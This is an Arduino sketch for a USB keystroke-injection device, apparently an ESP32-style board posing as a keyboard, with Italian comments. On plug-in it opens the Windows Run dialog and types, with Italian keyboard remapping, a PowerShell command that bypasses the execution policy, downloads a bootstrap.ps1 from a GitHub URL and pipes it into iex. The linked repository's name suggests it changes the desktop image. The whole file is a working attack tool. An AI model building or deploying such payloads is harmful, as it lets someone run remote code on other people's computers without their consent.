#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

// ── MODIFICA SOLO QUESTA RIGA ─────────────────────────────────────────────────
static const char URL[] =
    "powershell -ExecutionPolicy Bypass -Command "
    "\"iwr 'https://raw.githubusercontent.com/Gory-git/ChangeWindowsDesktopImage/main/scripts/bootstrap.ps1'|iex\"";
// ─────────────────────────────────────────────────────────────────────────────

static constexpr uint32_t DELAY_HID_INIT   = 8000U;
static constexpr uint32_t DELAY_RUN_DIALOG = 1200U;
static constexpr uint32_t DELAY_PER_CHAR   =   30U;

USBHIDKeyboard Keyboard;

static void pressCombo(uint8_t k1, uint8_t k2 = 0) {
    Keyboard.press(k1);
    if (k2) Keyboard.press(k2);
    delay(100);
    Keyboard.releaseAll();
    delay(80);
}


static void typeCharIT(char c) {
    switch (c) {
        case '-':
            // '/' in US = HID 0x38 = '-' su layout IT
            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
            break;
        case '_':
            // Shift+'/' in US = Shift+HID 0x38 = '_' su layout IT
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('/'); delay(50); Keyboard.releaseAll();
            break;
        case '/':
            // '/' in IT = Shift+7
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('7'); delay(50); Keyboard.releaseAll();
            break;
        case ':':
            // ':' in IT = Shift+'.'
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('.'); delay(50); Keyboard.releaseAll();
            break;
        case '"':
            // '"' in IT = Shift+2
            Keyboard.press(KEY_LEFT_SHIFT);
            Keyboard.press('2'); delay(50); Keyboard.releaseAll();
            break;
        case '\'':
            // apostrofo in IT = tasto '-' US = HID 0x2D
            Keyboard.press('-'); delay(50); Keyboard.releaseAll();
            break;
        case '.':
            Keyboard.press('.'); delay(50); Keyboard.releaseAll();
            break;
        default:
            Keyboard.print(c);
            break;
    }
    delay(DELAY_PER_CHAR);
}


static void typeStringIT(const char* str) {
    while (*str != '\0') { typeCharIT(*str++); }
}

void setup() {
    USB.begin();
    Keyboard.begin();
    delay(DELAY_HID_INIT);

    // Apri Win+R
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(DELAY_RUN_DIALOG);

    // Digita il comando con rimappatura italiana
    typeStringIT(URL);
    delay(400);
    pressCombo(KEY_RETURN);
}

void loop() {
    delay(60000U);
}
